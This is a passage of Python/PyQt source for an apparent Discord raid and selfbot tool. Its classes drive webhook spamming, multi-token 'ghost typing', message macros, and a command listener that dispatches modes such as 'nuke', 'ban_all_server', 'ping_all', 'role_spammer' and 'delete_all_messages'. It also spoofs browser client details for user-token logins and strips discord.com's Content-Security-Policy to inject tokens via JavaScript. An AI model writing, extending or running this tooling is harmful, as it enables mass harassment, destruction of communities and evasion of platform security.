        webhook_urls = [wh['url'] for wh in r.json()]
        if not webhook_urls: return
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            while self.running:
                for url in webhook_urls: executor.submit(self._send_random_webhook_worker, url)
                time.sleep(1.0)
    



class AICompanionBot(QThread):
    update_signal = pyqtSignal(str)
    finished = pyqtSignal(QObject, QPushButton)

    def __init__(self, tokens, system_prompt, lm_studio_url, use_gemini=False, gemini_key="", 
                 enable_ai_in_dms=False, enable_streaming=True,
                 enable_typing_notification=False, typing_duration=0, initiating_button: QPushButton = None):
        super().__init__()
        self.tokens = tokens
        self.system_prompt = system_prompt.strip()
        self.lm_studio_url = lm_studio_url.strip()
        self.use_gemini = use_gemini
        self.gemini_key = gemini_key.strip()
        self.enable_ai_in_dms = enable_ai_in_dms
        self.enable_streaming = enable_streaming
        self.enable_typing_notification = enable_typing_notification
        self.typing_duration = typing_duration
        self.running = False
        self.initiating_button = initiating_button
        self.ws = None
        self.last_sequence = None
        self.gateway_ready = threading.Event()
        self.bot_id = None
        self.gateway_thread = None
        self.conversation_memory = {}
        self.processed_messages = deque(maxlen=1000)
        
        self.session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(pool_connections=20, pool_maxsize=20)
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)

    def send_json_request_ai(self, ws, request):
        if not self.running: return
        try:
            ws.send(json.dumps(request))
        except websocket.WebSocketConnectionClosedException:
            self.update_signal.emit("AI Gateway: Connection closed unexpectedly.")
            self.running = False
        except Exception as e:
            self.update_signal.emit(f"AI Gateway: Error sending data: {e}")
            self.running = False

    def heartbeat_ai(self, interval, ws):
        while self.running:
            time.sleep(interval)
            if not self.running: break
            if ws.connected:
                self.send_json_request_ai(ws, {"op": 1, "d": self.last_sequence})
            else:
                self.update_signal.emit("AI Heartbeat: WebSocket connection lost. Terminating heartbeat.")
                break

    def connect_gateway_ai(self, token):
        reconnect_attempts = 0
        max_reconnect_attempts = 5
        base_reconnect_delay = 5

        while self.running and reconnect_attempts < max_reconnect_attempts:
            try:
                gateway_url = "wss://gateway.discord.gg/?v=9&encoding=json"
                self.update_signal.emit(f"[⚙️] AI Gateway: Attempting connection...")
                self.ws = websocket.create_connection(gateway_url)
                event = json.loads(self.ws.recv())
                heartbeat_interval = event['d']['heartbeat_interval'] / 1000

                hb_thread = threading.Thread(target=self.heartbeat_ai, args=(heartbeat_interval, self.ws), daemon=True)
                hb_thread.start()

                # Determine header/OS info based on token type
                is_bot = token.startswith("Bot ") or "." in token and len(token) > 70 # Rough check
                
                identify_payload = {
                    "op": 2,
                    "d": {
                        "token": token,
                        "intents": 33280, # MESSAGE_CONTENT (32768) + GUILD_MESSAGES (512)
                        "properties": {
                            "$os": "windows",
                            "$browser": "midnight-client",
                            "$device": "midnight-client"
                        }
                    }
                }
                self.send_json_request_ai(self.ws, identify_payload)
                reconnect_attempts = 0

                while self.running:
                    try:
                        event = json.loads(self.ws.recv())
                        self.last_sequence = event.get('s', self.last_sequence)
                        event_type = event.get('t')

                        if event_type == "READY":
                            self.bot_id = event['d']['user']['id']
                            self.update_signal.emit(f"[✅] AI Gateway Ready. Logged in as {event['d']['user']['username']}.")
                            self.gateway_ready.set()
                        elif event_type == "MESSAGE_CREATE":
                            self.process_incoming_message(event['d'])
                    except websocket.WebSocketConnectionClosedException:
                        break
                    except Exception:
                        break
                    if not self.running: break
            except Exception as e:
                self.update_signal.emit(f"[❌] AI Gateway: General connection error: {e}.")
            finally:
                if self.ws: self.ws.close()
                self.ws = None

            reconnect_attempts += 1
            if self.running and reconnect_attempts < max_reconnect_attempts:
                time.sleep(5)

        self.gateway_ready.set()
        
    def send_typing_indicator(self, channel_id, token):
        headers = {"Authorization": token, "Content-Type": "application/json"}
        try:
            self.session.post(f"https://discord.com/api/v9/channels/{channel_id}/typing", headers=headers, timeout=5)
        except Exception: pass

    def _edit_message(self, channel_id, message_id, content, token):
        if not self.running or not content.strip(): return False
        headers = {"Authorization": token, "Content-Type": "application/json"}
        payload = {"content": content}
        try:
            r = self.session.patch(f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}", headers=headers, json=payload, timeout=8)
            return r.status_code == 200
        except: return False

    def send_reply(self, channel_id, message_id, content, token):
        headers = {"Authorization": token, "Content-Type": "application/json"}
        try:
            payload = {"content": content, "message_reference": {"message_id": message_id, "channel_id": channel_id}}
            r = self.session.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json=payload, timeout=10)
            if r.status_code == 200:
                self.update_signal.emit(f"📤 AI Bot replied.")
        except Exception as e:
            self.update_signal.emit(f"⚠️ AI Bot failed to reply: {e}")

    def send_initial_reply(self, channel_id, original_message_id, token):
        headers = {"Authorization": token, "Content-Type": "application/json"}
        try:
            payload = {"content": "...", "message_reference": {"message_id": original_message_id, "channel_id": channel_id}}
            r = self.session.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json=payload, timeout=10)
            return r.json() if r.status_code == 200 else None
        except: return None

    def process_incoming_message(self, message_data):
        if not self.running: return

        message_id, author_id = message_data.get('id'), message_data.get('author', {}).get('id')
        channel_id, content = message_data.get('channel_id'), message_data.get('content', '')
        is_dm = message_data.get('guild_id') is None
        # Check mentions. If bot mode, bot_id will be the bot's ID.
        is_mentioned = any(m.get('id') == self.bot_id for m in message_data.get('mentions', []))
        ref_msg = message_data.get('referenced_message')
        is_reply_to_me = ref_msg and ref_msg.get('author', {}).get('id') == self.bot_id

        if author_id == self.bot_id or message_id in self.processed_messages: return

        if (is_dm and self.enable_ai_in_dms) or (not is_dm and (is_mentioned or is_reply_to_me)):
            self.processed_messages.append(message_id)
            prompt = re.sub(r'<@!?\d+>', '', content).strip()
            
            self.update_signal.emit(f"💬 AI Triggered by {message_data['author']['username']}")
            
            token = self.tokens[0]
            # Ensure "Bot " prefix if needed for actions
            req_token = f"Bot {token}" if not token.startswith("Bot ") and "." in token else token

            if self.enable_typing_notification and self.typing_duration > 0:
                self.send_typing_indicator(channel_id, req_token)
                time.sleep(self.typing_duration)
            
            if self.enable_streaming:
                initial_reply = self.send_initial_reply(channel_id, message_id, req_token)
                if initial_reply:
                    threading.Thread(target=self.stream_and_edit_reply, args=(
                        channel_id, initial_reply['id'], prompt, req_token, author_id), daemon=True).start()
            else:
                threading.Thread(target=self.generate_and_send_reply, args=(
                    channel_id, message_id, prompt, req_token, author_id), daemon=True).start()

    def generate_and_send_reply(self, channel_id, original_message_id, prompt, token, user_id):
        full_reply = self._generate_full_reply(prompt, user_id, channel_id)
        if self.running and full_reply:
            self.send_reply(channel_id, original_message_id, full_reply, token)

    def _call_gemini_api(self, messages):
        """Calls Google Gemini API via HTTP requests."""
        if not self.gemini_key: return "Gemini API Key is missing."
        
        url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent?key={self.gemini_key}"
        
        # Convert standard messages list to Gemini format
        gemini_contents = []
        system_instruction = None

        for msg in messages:
            role = "user" if msg['role'] == "user" else "model"
            if msg['role'] == "system":
                # Extract system prompt
                system_instruction = {"parts": [{"text": msg['content']}]}
                continue
            
            parts = [{"text": msg['content']}] if isinstance(msg['content'], str) else []
            # Handle images if you add image support later, for now text only
            if isinstance(msg['content'], list):
                 for item in msg['content']:
                     if item.get('type') == 'text': parts.append({"text": item['text']})

            gemini_contents.append({"role": role, "parts": parts})

        payload = {"contents": gemini_contents}
        if system_instruction:
            payload["system_instruction"] = system_instruction

        try:
            r = requests.post(url, headers={"Content-Type": "application/json"}, json=payload, timeout=30)
            if r.status_code == 200:
                data = r.json()
                try:
                    return data['candidates'][0]['content']['parts'][0]['text']
                except (KeyError, IndexError):
                    return "Gemini returned an empty or unreadable response."
            else:
                return f"Gemini Error ({r.status_code}): {r.text[:100]}"
        except Exception as e:
            return f"Gemini Connection Error: {e}"

    def _generate_full_reply(self, prompt, user_id, channel_id):
        conv_key = f"{channel_id}_{user_id}"
        if conv_key not in self.conversation_memory:
            self.conversation_memory[conv_key] = deque(maxlen=12)

        messages = [{"role": "system", "content": self.system_prompt}] if self.system_prompt else []
        messages.extend(list(self.conversation_memory[conv_key]))
        messages.append({"role": "user", "content": prompt})

        reply = ""
        try:
            if self.use_gemini:
                reply = self._call_gemini_api(messages)
            else:
                # LM Studio / OpenAI Compatible
                r = self.session.post(self.lm_studio_url, json={"messages": messages, "temperature": 0.8, "max_tokens": 600, "stream": False}, timeout=25)
                if r.status_code == 200:
                    reply = r.json()['choices'][0]['message']['content'].strip()
                else:
                    reply = f"AI Error ({r.status_code})"
            
            # Save to memory
            if reply:
                self.conversation_memory[conv_key].append({"role": "user", "content": prompt})
                self.conversation_memory[conv_key].append({"role": "assistant", "content": reply})
            return reply

        except Exception as e:
            self.update_signal.emit(f"⚠️ AI Gen Error: {e}")
            return "I'm having trouble thinking right now."

    def stream_and_edit_reply(self, channel_id, message_id_to_edit, prompt, token, user_id):
        full_reply = self._generate_full_reply(prompt, user_id, channel_id)
        if not self.running or not full_reply: return

        # Fake streaming effect since we generated full reply
        chunk_size = len(full_reply) // 4 + 1
        for i in range(chunk_size, len(full_reply) + chunk_size, chunk_size):
            if not self.running: break
            current_text = full_reply[:i]
            self._edit_message(channel_id, message_id_to_edit, current_text + "..." if i < len(full_reply) else full_reply, token)
            time.sleep(0.4)

    def run(self):
        self.running = True
        try:
            token = self.tokens[0]
            # Ensure proper gateway auth format
            gw_token = f"Bot {token}" if self.tokens[0].startswith("M") or self.tokens[0].startswith("O") or "." in token else token
            self.connect_gateway_ai(gw_token)
        except Exception as e:
            self.update_signal.emit(f"[❌] AI Bot thread failed: {e}\n{traceback.format_exc()}")
        finally:
            self.running = False
            self.finished.emit(self, self.initiating_button)

    def stop(self):
        self.update_signal.emit("[🛑] Stopping AI Companion...")
        self.running = False
        if self.ws: self.ws.close()







class GhostTyperBot(QThread):
    """
    A dedicated thread that sends continuous typing events to a channel
    to create a "ghost typing" effect, now with multi-token support and session pooling.
    """
    update_signal = pyqtSignal(str)
    finished = pyqtSignal(QObject, QPushButton)

    def __init__(self, tokens, channel_id, initiating_button=None):
        super().__init__()
        self.tokens = tokens
        self.channel_id = channel_id
        self.initiating_button = initiating_button
        self.running = False
        self.threads = []
        
        # --- SESSION FIX ---
        self.session = requests.Session()
        # Pool size matches token count (up to 100) to avoid blocking
        pool_size = min(len(tokens) + 5, 100) 
        adapter = requests.adapters.HTTPAdapter(pool_connections=pool_size, pool_maxsize=pool_size)
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)
        # -------------------

    def _worker(self, token):
        """The actual typing loop for a single token."""
        headers = {
            "Authorization": token,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
        endpoint = f"https://discord.com/api/v9/channels/{self.channel_id}/typing"
        token_short = token[-4:]

        while self.running:
            try:
                # Use self.session.post instead of requests.post
                response = self.session.post(endpoint, headers=headers, timeout=5)
                
                if response.status_code in [401, 403, 404]:
                    self.update_signal.emit(f"[❌] Ghost Typer (token ...{token_short}) stopped. Error: {response.status_code}. Check token and Channel ID.")
                    break
            except requests.exceptions.RequestException as e:
                self.update_signal.emit(f"[❌] Ghost Typer (token ...{token_short}) network error: {e}. Stopping.")
                break

            # Interruptible sleep
            end_time = time.time() + 8
            while self.running and time.time() < end_time:
                time.sleep(0.1)

    def run(self):
        self.running = True
        self.update_signal.emit(f"[👻] Ghost Typer started in channel {self.channel_id} with {len(self.tokens)} token(s).")

        for token in self.tokens:
            if not self.running:
                break
            thread = threading.Thread(target=self._worker, args=(token,), daemon=True)
            self.threads.append(thread)
            thread.start()
        for thread in self.threads:
            thread.join()
        self.finished.emit(self, self.initiating_button)

    def stop(self):
        """Signals the main thread and all worker threads to stop running."""
        self.running = False

        



class MacroBot(QThread):
    """
    A dedicated thread to run a message macro, sending a specific message
    to a channel at a regular interval. This version includes robust error handling.
    """
    update_signal = pyqtSignal(str)
    finished_signal = pyqtSignal(QObject, QPushButton)

    def __init__(self, token, channel_id, messages, use_random, delay, image_data, message_sender_func, initiating_button=None):
        super().__init__()
        self.token = token
        self.channel_id = channel_id
        self.messages = messages
        self.use_random = use_random
        self.delay = delay
        self.image_data = image_data
        self.message_sender = message_sender_func
        self.initiating_button = initiating_button
        self.running = False

    def run(self):
        self.running = True
        self.update_signal.emit(f"[▶️] Macro started. Sending to channel {self.channel_id} every {self.delay}s.")

        try:
            while self.running:
                message_to_send = ""
                if self.messages:
                    if self.use_random:
                        message_to_send = random.choice(self.messages)
                    else:
                        message_to_send = '\n'.join(self.messages)

                # This calls the dedicated message sender function
                success = self.message_sender(self.token, self.channel_id, message_to_send, self.image_data)
                if not success:
                    self.update_signal.emit(f"  -> Macro stopping due to send failure.")
                    break

                # Interruptible sleep loop to allow the bot to be stopped quickly
                end_time = time.time() + self.delay
                while self.running and time.time() < end_time:
                    time.sleep(0.1)

        except Exception as e:
            self.update_signal.emit("[CRITICAL-ERROR] The macro has crashed! See details below.")
            self.update_signal.emit(f"[CRITICAL-ERROR] Type: {type(e).__name__}")
            self.update_signal.emit(f"[CRITICAL-ERROR] Details: {str(e)}")
            self.update_signal.emit(traceback.format_exc())
        finally:
            self.update_signal.emit("[🛑] Macro stopped.")
            self.running = False
            self.finished_signal.emit(self, self.initiating_button)

    def stop(self):
        """Signals the thread to stop running."""
        self.running = False


class CommandActionListener(QThread):
    update_signal = pyqtSignal(str)
    finished = pyqtSignal(QObject, QPushButton)
    command_log_signal = pyqtSignal(str)
    command_triggered = pyqtSignal(object, dict)

    def __init__(self, tokens: list, main_gui_instance, initiating_button: QPushButton = None):
        super().__init__()
        self.tokens = tokens
        self.main_gui = main_gui_instance
        self.running = False
        self.initiating_button = initiating_button
        self.processed_messages = deque(maxlen=2000)
        self._lock = threading.Lock()
        self.gateway_threads = []
        self.message_queue = queue.Queue()
        self.token_user_ids = {}
        self.is_ready = threading.Event()
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
        self.build_number = LATEST_BUILD_NUMBER or 468845

    def send_json_request_gateway(self, ws, request):
        if not self.running or not ws or not ws.connected: return
        try:
            ws.send(json.dumps(request))
        except (websocket.WebSocketConnectionClosedException, AttributeError):
            pass
        except Exception as e:
            self.command_log_signal.emit(f"[❌] Gateway Error (Send): {e}")

    def heartbeat_gateway(self, interval, ws, session_state):
        while self.running:
            time.sleep(interval)
            if not self.running: break
            if ws and ws.connected:
                self.send_json_request_gateway(ws, {"op": 1, "d": session_state['s']})
            else:
                break

    def connect_gateway(self, token):
        token_short = token[-4:]
        ws = None
        session_state = {'s': None}
        while self.running:
            try:
                gateway_url = "wss://gateway.discord.gg/?v=9&encoding=json"
                ws = websocket.create_connection(gateway_url, timeout=15)
                self.command_log_signal.emit(f"Listener ...{token_short}: Connection established.")
                event = json.loads(ws.recv())
                heartbeat_interval = event['d']['heartbeat_interval'] / 1000
                hb_thread = threading.Thread(target=self.heartbeat_gateway,
                                             args=(heartbeat_interval, ws, session_state), daemon=True)
                hb_thread.start()
                properties = {
                    "os": "Windows", "browser": "Chrome", "device": "", "system_locale": "en-US",
                    "browser_user_agent": self.user_agent, "browser_version": "108.0.0.0", "os_version": "10",
                    "release_channel": "stable", "client_build_number": self.build_number, "client_event_source": None,
                }
                auth_payload = {
                    "op": 2,
                    "d": {
                        "token": token, "capabilities": 16381, "properties": properties,
                        "presence": {"status": "online", "since": 0, "activities": [], "afk": False},
                        "compress": False, "client_state": {"guild_versions": {}},
                        "intents": (1 << 0) | (1 << 9) | (1 << 12)
                    }
                }
                self.send_json_request_gateway(ws, auth_payload)
                while self.running:
                    if not ws.connected:
                        self.command_log_signal.emit(
                            f"Listener ...{token_short}: Disconnected. Will attempt to reconnect.")
                        self.is_ready.clear()
                        break
                    event_data = ws.recv()
                    if not event_data: continue
                    event = json.loads(event_data)
                    if 's' in event and event['s'] is not None:
                        session_state['s'] = event['s']
                    event_type = event.get('t')
                    if event_type == "READY":
                        user = event['d']['user']
                        self.command_log_signal.emit(
                            f"[✅] Listener for ...{token_short}: Ready as {user['username']} (ID: {user['id']}).")
                        self.token_user_ids[token] = user['id']
                        if not self.is_ready.is_set(): self.is_ready.set()
                    elif event_type == "MESSAGE_CREATE":
                        self.message_queue.put((event['d'], token))
            except (websocket.WebSocketException, ConnectionResetError, json.JSONDecodeError) as e:
                self.command_log_signal.emit(
                    f"Listener ...{token_short}: Connection error ({type(e).__name__}). Retrying in 5s...")
            except Exception as e:
                self.command_log_signal.emit(f"Listener ...{token_short}: Unexpected error: {e}. Retrying in 5s...")
            finally:
                if ws: ws.close()
                if self.running:
                    self.is_ready.clear()
                    time.sleep(5)

    def message_processor_loop(self):
        if not self.is_ready.wait(timeout=30):
            self.command_log_signal.emit("[❌] Timed out waiting for any gateway to become ready. Stopping listener.")
            self.stop()
            return

        while self.running:
            try:
                queued_item = self.message_queue.get(timeout=1)
                if queued_item is None: break
                message_data, listener_token = queued_item
                author_id = message_data.get('author', {}).get('id')

                # Check if the author of the message is one of our logged-in tokens
                if author_id in self.token_user_ids.values():
                    # Find which token corresponds to the author ID
                    author_token = next((t for t, uid in self.token_user_ids.items() if uid == author_id), None)
                    if author_token:
                        self.process_incoming_message(message_data, author_id, author_token)

                self.message_queue.task_done()
            except queue.Empty:
                continue
            except Exception as e:
                self.command_log_signal.emit(f"[❌] Error in message processor: {e}")

    def process_incoming_message(self, message_data, author_id, author_token):
        content = message_data.get('content', '').strip()
        if not content:
            return

        with self._lock:
            message_id = message_data.get('id')
            processing_key = (message_id, author_id)
            if processing_key in self.processed_messages: return
            self.processed_messages.append(processing_key)

        self.command_log_signal.emit(
            f"[▶️] Bot '{message_data.get('author', {}).get('username')}' sent command: {content}")
        command_name_received = content.lower().split(' ')[0]
        if command_name_received.startswith(('!', '.', '?', '#', '$')):
            command_name_received = command_name_received[1:]

        for cmd_obj in self.main_gui.custom_commands:
            if not cmd_obj.enabled: continue
            aliases_lower = [a.lower().lstrip('!.?#$') for a in cmd_obj.aliases]
            cmd_name_lower = cmd_obj.name.lower().lstrip('!.?#$')

            if command_name_received == cmd_name_lower or command_name_received in aliases_lower:
                self.command_log_signal.emit(f"   -> Match found for command '{cmd_obj.name}'. Triggering action...")
                tokens_for_action = [author_token]
                if self.main_gui.command_execute_all_tokens_check.isChecked():
                    tokens_for_action = self.tokens

                parts = content.split(' ', 1)
                # If arguments exist, pass them. Otherwise, pass None to signal that the default should be used.
                message_arguments = parts[1] if len(parts) > 1 else None

                context = {
                    'server_id': message_data.get('guild_id'),
                    'channel_id': message_data.get('channel_id'),
                    'command_message_id': message_id,
                    'replied_user_id': message_data.get('referenced_message', {}).get('author', {}).get('id'),
                    'replied_message_id': message_data.get('referenced_message', {}).get('id'),
                    'tokens_to_use': tokens_for_action,
                    'message': message_arguments # This will be the arguments string or None
                }
                self.command_triggered.emit(cmd_obj, context)
                return
        

    def run(self):
        self.running = True
        self.update_signal.emit(f"🤖 Starting Command Listener for {len(self.tokens)} token(s)...")
        processor_thread = threading.Thread(target=self.message_processor_loop, daemon=True)
        processor_thread.start()
        for token in self.tokens:
            thread = threading.Thread(target=self.connect_gateway, args=(token,), daemon=True)
            self.gateway_threads.append(thread)
            thread.start()
        while self.running:
            time.sleep(1)
        self.update_signal.emit("[🛑] Command Listener shutting down all connections.")
        self.finished.emit(self, self.initiating_button)

    def stop(self):
        if not self.running: return
        self.running = False
        self.command_log_signal.emit("[🛑] Received stop signal. Shutting down...")
        self.message_queue.put(None)
        for thread in self.gateway_threads:
            if thread.is_alive():
                thread.join(timeout=1.0)
        self.gateway_threads.clear()


class GlassPanel(QFrame):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setStyleSheet("""
            QFrame {
                background: rgba(26, 32, 44, 0.25);
                border: 1px solid rgba(74, 85, 104, 0.2);
                border-radius: 24px;
                box-shadow: inset 0 0 15px rgba(0, 0, 0, 0.3);
            }
        """)








class ParameterInputDialog(StyledDialog):
    def __init__(self, title, params_config, previous_params=None, parent=None):
        super().__init__(title, parent)
        self.params_config = params_config  # Store the config

        # Container for this dialog's specific widgets
        container = QFrame()
        container.setStyleSheet("background:transparent;")
        self.layout = QVBoxLayout(container)
        self.layout.setContentsMargins(0, 5, 0, 10)
        self.layout.setSpacing(10)

        label_style = "color: white; background: transparent;"
        spinbox_style = "QSpinBox { background: #2D3748; border: 1px solid #4A5568; padding: 5px; border-radius: 4px; color: white; }"
        slider_style = """
            QSlider::groove:horizontal { border: 1px solid #999; height: 8px; background: rgba(74, 85, 104, 0.4); margin: 2px 0; border-radius: 4px; }
            QSlider::handle:horizontal { background: rgba(99, 179, 237, 0.8); border: 1px solid rgba(99, 179, 237, 0.9); width: 18px; margin: -5px 0; border-radius: 9px; }
        """

        self.widgets = {}
        for key, config in self.params_config.items():
            if config['type'] == 'line_edit':
                self.layout.addWidget(QLabel(config['label'], styleSheet=label_style))
                widget = ModernLineEdit()
                widget.setPlaceholderText(config.get('placeholder', ''))
                if previous_params: widget.setText(previous_params.get(key, ''))
                self.layout.addWidget(widget)
                self.widgets[key] = widget

            elif config['type'] == 'spinbox':
                self.layout.addWidget(QLabel(config['label'], styleSheet=label_style))
                widget = QSpinBox()
                widget.setRange(config.get('min', 1), config.get('max', 1000))
                widget.setValue(
                    previous_params.get(key, config.get('default', 50)) if previous_params else config.get('default',
                                                                                                           50))
                widget.setStyleSheet(spinbox_style)
                self.layout.addWidget(widget)
                self.widgets[key] = widget

            elif config['type'] == 'slider':
                slider_layout = QHBoxLayout()
                label = QLabel(f"{config['label']}:")
                label.setStyleSheet(label_style)
                slider = AnimatedSlider(Qt.Orientation.Horizontal)
                slider.setRange(config.get('min', 0), config.get('max', 100))

                default_val = config.get('default', 1.0)
                initial_val = previous_params.get(key, default_val) if previous_params else default_val

                slider.setValue(int(initial_val * 10) if config.get('is_float') else int(initial_val))

                val_label = QLabel(f"{initial_val:.1f}{config.get('suffix', '')}" if config.get(
                    'is_float') else f"{initial_val}{config.get('suffix', '')}")
                val_label.setStyleSheet(label_style)

                if config.get('is_float'):
                    slider.valueChanged.connect(
                        lambda v, lbl=val_label, s=config.get('suffix', ''): lbl.setText(f"{v / 10.0:.1f}{s}"))
                else:
                    slider.valueChanged.connect(
                        lambda v, lbl=val_label, s=config.get('suffix', ''): lbl.setText(f"{v}{s}"))

                slider.setStyleSheet(slider_style)
                slider_layout.addWidget(label)
                slider_layout.addWidget(slider)
                slider_layout.addWidget(val_label)
                self.layout.addLayout(slider_layout)
                self.widgets[key] = slider

        self.layout.addStretch()


        ok_btn = MinimalButton("OK")
        ok_btn.setMinimumHeight(40)
        ok_btn.clicked.connect(self.accept)
        self.layout.addWidget(ok_btn)

        self.content_layout.addWidget(container)
        self.adjustSize()

    def get_params(self):
        params = {}
        for key, widget in self.widgets.items():
            config = self.params_config[key]
            if isinstance(widget, QLineEdit):
                params[key] = widget.text()
            elif isinstance(widget, QSpinBox):
                params[key] = widget.value()
            elif isinstance(widget, QSlider):
                if config.get('is_float'):
                    params[key] = widget.value() / 10.0
                else:
                    params[key] = widget.value()
        return params


class CommandExecutorWorker(QObject):
    """
    This worker class handles the execution of a custom command's actions
    on a separate thread to prevent the GUI from freezing.
    """
    finished = pyqtSignal()
    log_signal = pyqtSignal(str)

    def __init__(self, main_gui, custom_command, context):
        super().__init__()
        self.main_gui = main_gui
        self.custom_command = custom_command
        self.context = context

    def execute(self):
        """The main logic for executing a command's actions, now with error handling."""
        try:
            self.log_signal.emit(f"[▶️] Executing command '{self.custom_command.name}' in background thread.")

            bots_for_this_command = []

            for action_index, action_data in enumerate(self.custom_command.actions):
                if not self.main_gui.command_listener_bot or not self.main_gui.command_listener_bot.running:
                    self.log_signal.emit(f"[🛑] Command '{self.custom_command.name}' stopped by global stop signal.")
                    break

                action_type = action_data.get("type")
                
                # Start with the pre-configured parameters from the saved command.
                bot_options = copy.deepcopy(action_data.get("params", {}))
                
                # Create a copy of the live context from the command trigger.
                live_context = self.context.copy()
                
                # Get the message from the live command trigger (e.g., "hello there" from "!s hello there").
                # This will be None if the user just typed "!s".
                live_message = live_context.pop('message', None)

                # Now, update the options with the rest of the live context (like channel_id, server_id, etc.).
                bot_options.update(live_context)
                
                # CRITICAL: Only override the message parameter if the user actually provided one live.
                # If they didn't (live_message is None), the pre-configured message from bot_options will be used.
                if live_message is not None:
                    bot_options['message'] = live_message

                self.log_signal.emit(f"  --> Action {action_index + 1}: {action_type.replace('_', ' ').title()}")

                full_modes = ["nuke", "nuclear", "turbo", "reaction_spammer", "status_changer", "role_spammer",
                              "webhook_spammer", "webhook_spam_existing", "webhook_create_only", "create_channels",
                              "member_logger", "super_scan_members", "ban_from_log", "ping_all",
                              "send_multiple_messages", "delete_messages", "delete_all_messages",
                              "ban_all_server", "ping_all_server"]

                final_options = {}
                current_mode_to_run = ""

                if action_type in full_modes:
                    current_mode_to_run = action_type
                    final_options = bot_options
                else:
                    current_mode_to_run = "single_action"
                    final_options = {"single_action_details": {"type": action_type, "params": bot_options}}

                bot_instance = self.main_gui.start_bot(current_mode_to_run, command_options=final_options)

                if bot_instance:
                    bots_for_this_command.append(bot_instance)

                if self.custom_command.duration_type == "until_done" and bot_instance:
                    bot_instance.wait()

            if self.custom_command.duration_type == "fixed_seconds":
                time.sleep(self.custom_command.duration_value)
                for bot in bots_for_this_command:
                    if bot.isRunning():
                        bot.stop()

            self.log_signal.emit(f"[✅] Finished dispatching actions for command '{self.custom_command.name}'.")

        except Exception as e:
            self.log_signal.emit(f"[❌] An error occurred in the command executor: {e}")
            self.log_signal.emit(traceback.format_exc())
        finally:
            self.finished.emit()




class CspInterceptor(QWebEngineUrlRequestInterceptor):
    """
    Intercepts network requests to remove the Content-Security-Policy header
    from the main Discord page, allowing token login via JavaScript.
    """
    def interceptRequest(self, info: QWebEngineUrlRequestInfo):
        # We only target the main HTML document from discord.com
        if "discord.com" in info.requestUrl().host() and info.resourceType() == QWebEngineUrlRequestInfo.ResourceType.ResourceTypeMainFrame:
            # This effectively deletes the header, disabling the CSP
            info.setHttpHeader(b"Content-Security-Policy", b"")
        





# PASTE THIS ENTIRE NEW CLASS INTO YOUR SCRIPT

class PermissionAwareWebEnginePage(QWebEnginePage):
    """
    A custom QWebEnginePage that automatically grants media permissions
    (microphone and camera) to discord.com.
    """
    def __init__(self, profile, parent=None):
        super().__init__(profile, parent)
        # Connect the signal that is emitted whenever a feature permission is requested
        self.featurePermissionRequested.connect(self._handle_permission_request)

    def _handle_permission_request(self, url, feature):
        # Check if the request is coming from discord.com
        if "discord.com" in url.host():
            # Check if the requested feature is for the microphone or camera
            if feature in (QWebEnginePage.Feature.MediaAudioCapture, 
                           QWebEnginePage.Feature.MediaVideoCapture):
                # If it is, grant the permission automatically
                self.setFeaturePermission(url, feature, QWebEnginePage.PermissionPolicy.PermissionGranted)
            else:
                # For any other unexpected feature from Discord, deny it by default for security
                self.setFeaturePermission(url, feature, QWebEnginePage.PermissionPolicy.PermissionDenied)
        else:
            # If the request is not from discord.com, deny it
            self.setFeaturePermission(url, feature, QWebEnginePage.PermissionPolicy.PermissionDenied)
class BotStarterWorker(QObject):
    """
    A worker that prepares a bot instance on a background thread.
    This prevents the GUI from freezing when an action button is clicked,
    especially when gathering a large number of member IDs.
    """
    log_message = pyqtSignal(str)
    bot_ready = pyqtSignal(object)  # Signal to pass the prepared bot back to the main thread

    def __init__(self, main_gui, mode, final_tokens, command_options, initiating_button):
        super().__init__()
        self.main_gui = main_gui
        self.mode = mode
        self.final_tokens = final_tokens
        self.command_options = command_options
        self.initiating_button = initiating_button
        self.is_bot_mode = main_gui.is_bot_mode

    def run(self):
        """This is the entry point for the background thread."""
        try:
            self.log_message.emit(f"[⚙️] Preparing bot '{self.mode}' in the background...")
            
            options = self.main_gui.get_current_bot_options()
            if self.command_options is not None:
                options.update(self.command_options)

            if self.is_bot_mode:
                bot_instance = MidnightClientBot(
                    tokens=self.final_tokens,
                    options=options,
                    initiating_button=self.initiating_button,
                    is_bot_mode=True
                )
            else:
                bot_instance = MidnightClientSelfBot(
                    tokens=self.final_tokens,
                    options=options,
                    initiating_button=self.initiating_button
                )
            
            bot_instance.current_mode = self.mode
            
            # Send the fully prepared bot back to the main thread
            self.bot_ready.emit(bot_instance)

        except Exception as e:
            self.log_message.emit(f"[❌] Critical error during bot preparation: {e}")
            # Ensure the button is re-enabled on failure
            if self.initiating_button:
                self.initiating_button.setEnabled(True)



class MainGUI(QWidget):
    set_stop_button_enabled = pyqtSignal(bool)

    def __init__(self, parent=None, animated_background=None, is_bot_mode=False):
        super().__init__(parent)
        self.animated_background = animated_background
        self.is_bot_mode = is_bot_mode  # <-- CRUCIAL: Stores the bot mode status
        self.star_color_pickers = []
        self.text_color_pickers = []
        self.target_notification = ServerTargetNotification(self)
        self.active_workers = []
        self.tokens = []
        self.running_bots = []
        self.server_name_cache = {} 
        self.server_completer = None 
        self.cloned_server_data = {}
        self.loaded_member_ids = []
        self.pinged_member_ids = set()
        self.injection_attempted = False
        self.bypass_rate_limits_check = None
        self.custom_commands = []
        self.command_listener_bot = None
        self.current_command_actions = []
        self.available_actions = {}
        self.currently_editing_command = None
        self.is_command_executing = False
        self.main_functions_container = None
        self.updates_container = None
        self.settings_content_widget = None
        self.ai_chat_container = None
        self.cloner_container = None
        self.members_container = None
        self.commands_container = None
        self.command_execute_all_tokens_check = None
        self.side_nav_button_group = QButtonGroup(self)
        self.main_func_tab_buttons = QButtonGroup(self)
        self.updates_tab_buttons = QButtonGroup(self)
        self.commands_tab_buttons = QButtonGroup(self)
